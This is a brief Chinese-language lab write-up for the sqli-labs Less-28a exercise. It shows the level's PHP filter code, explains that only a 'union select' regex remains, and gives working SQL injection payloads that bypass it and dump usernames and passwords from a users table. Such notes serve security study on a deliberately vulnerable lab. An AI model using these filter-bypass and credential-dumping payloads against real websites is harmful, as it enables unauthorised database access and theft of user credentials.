# Less-28a （宽松版，仅一条过滤）

## 查看分析源码

和 Less-28 比，大部分过滤都被注释掉了：

```php
// $id= preg_replace('/[\/\*]/',"", $id);
// $id= preg_replace('/[--]/',"", $id);
// $id= preg_replace('/[#]/',"", $id);
// $id= preg_replace('/[ +]/',"", $id);
// $id= preg_replace('/select/m',"", $id);
// $id= preg_replace('/[ +]/',"", $id);

$id= preg_replace('/union\s+select/i',"", $id);  // 唯一有效过滤
```

空格、`--` 注释、`/**/` 全都能直接用

所以 payload 就很自由：

```
?id=-1') union all select 1,2,3 --+
```

或者：

```
?id=-1') union/**/select 1,2,3 --+
```

## 爆数据

```
?id=-1') union all select 1,group_concat(username,0x3a,password),3 from users --+
```
![](99_Attachments/图片/Less-28a/file-20260615202157288.png)

比 Less-28 省心多了，只有 `union all select` 这个坑要注意，其他随便写
